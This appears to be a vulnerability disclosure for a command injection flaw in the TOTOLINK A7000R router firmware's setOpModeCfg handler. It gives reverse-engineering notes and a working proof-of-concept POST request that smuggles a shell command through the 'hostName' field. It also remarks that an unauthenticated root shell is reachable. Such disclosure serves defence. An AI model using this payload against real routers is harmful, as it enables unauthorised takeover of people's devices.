# TOTOLink A7000R V9.1.0u.6115_B20201022 Has an command injection vulnerability

## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ： https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html

### Product Information

TOTOLink A7000R V9.1.0u.6115_B20201022 router, the latest version of simulation overview：

![image-20220719210324254](img/image-20220719210324254.png)

## Vulnerability details

TOTOLINK A7000R (V9.1.0u.6115_B20201022) was found to contain a command insertion vulnerability in setOpModeCfg.This vulnerability allows an attacker to execute arbitrary commands through the "hostName" parameter.

![image-20220719225606059](img/image-20220719225606059.png)

![image-20220719225916336](img/image-20220719225916336.png)

![image-20220719231241544](img\image-20220719231241544.png)

By calling these functions, we can ultimately call `sub_423970` function (as shown in the last picture). By setting the proto value to 1, we can reach the default branch.`V50` passes directly into the `dosystem` function.

![image-20220719205544791](img/image-20220719205544791.png)

The `dosystem` function is finally found to be implemented in this file by string matching.

![image-20220719205811209](img/image-20220719205811209.png)

Reverse analysis found that the function was called directly through the `system` function, which has a command injection vulnerability.

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 52
Origin: http://192.168.0.1
DNT: 1
Connection: close
Cookie: SESSION_ID=2:1658224702:2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Pragma: no-cache
Cache-Control: no-cache

{"hostName":"admin';ps #","proto":"1","opmode":"br","topicurl":"setOpModeCfg"}
```

![image-20220719212510596](img/image-20220719212510596.png)

 The above figure shows the POC attack effect 

![image-20220720065911385](img/image-20220720065911385.png)

Finally, you can write exp to get a stable root shell without authorization.
